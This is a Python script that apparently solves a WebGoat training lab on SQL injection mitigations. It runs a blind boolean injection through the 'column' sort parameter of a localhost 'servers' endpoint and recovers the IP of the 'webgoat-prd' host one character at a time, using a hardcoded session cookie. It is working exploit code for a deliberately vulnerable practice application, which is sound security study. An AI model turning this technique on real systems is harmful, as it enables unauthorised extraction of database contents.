#!/usr/bin/python3

import requests
import json

"""
case when((select top 1 substring(ip,0,1) from servers where hostname='webgoat-prd')='1') then id else ip end
"""

#url = "http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=case+when%28%28select+top+1+substring%28ip%2C{}%2C1%29+from+servers+where+hostname%3D%27webgoat-prd%27%29%3D%27{}%27%29+then+id+else+ip+end"

url = "http://localhost:8080/WebGoat/SqlInjectionMitigations/servers"
headers = {"Cookie":"JSESSIONID=qjZFwF4-8_OXx2dQEyvs_ar0UCw4tbZBn2kqxsk6" }

for position in range(16):
	for digit in {"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "."}:
		#print("position", position, "digit", digit)

		params = {"column":"case when((select top 1 substring(ip,{},1) from servers where hostname='webgoat-prd')='{}') then id else ip end".format(position,digit)}

		response = requests.get(url, headers=headers, params=params)
		#print(response.text)

		json_response = json.loads(response.text)
		#print(params)
		#print(json_response[0])

		if json_response[0]["id"] == '1':
			print(digit)